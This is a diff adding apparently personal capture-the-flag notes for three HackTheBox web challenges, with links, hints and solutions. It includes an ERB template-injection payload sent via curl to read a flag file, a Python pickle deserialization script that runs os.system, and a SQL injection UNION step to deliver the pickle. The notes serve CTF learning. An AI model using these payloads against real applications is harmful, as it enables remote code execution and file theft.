@@ -9,3 +9,36 @@
     E. This command typically lists the files and directories in a Unix/Linux system.
 
 **02 Toxic:** cookie to base64
+    Link: https://app.hackthebox.com/challenges/toxic
+    Hint: Cache is Encoded With Base64 and LFI to RCE via Header Injection.
+    Solution: https://dhanush-ramuk.medium.com/toxic-hackthebox-challenge-walkthrough-easy-5629d066c127
+ 
+**03 Neonify:**
+    Link: https://app.hackthebox.com/challenges/neonify
+    Hint: Encode With url Encoding.
+           <%= File.open('flag.txt').read %> # Read file
+    Solution: curl 159.65.20.166:32127 \        
+		-s -X POST -d 'neon=a
+		%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' | grep -Eo 'HTB{.*}'
+    Explanation: https://drt.sh/posts/htb-neonify/
+    
+**04 COP:**
+    Link: https://app.hackthebox.com/challenges/cop
+    Hint: No Flag value in DB, use script
+		import pickle
+		import base64
+		import os
+		payload = 'cp flag.txt application/static/.'
+		class RCE:
+		    def __reduce__(self):
+			return os.system, (payload,)
+		if __name__ == '__main__':
+		    print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode('ascii'))
+	Steps:
+		run script on local copy the <value> output and 
+		add to the url like 
+		target/1' UNION SELECT '<VALUE>
+    Solution: https://drt.sh/posts/htb-cop/
+
+
+
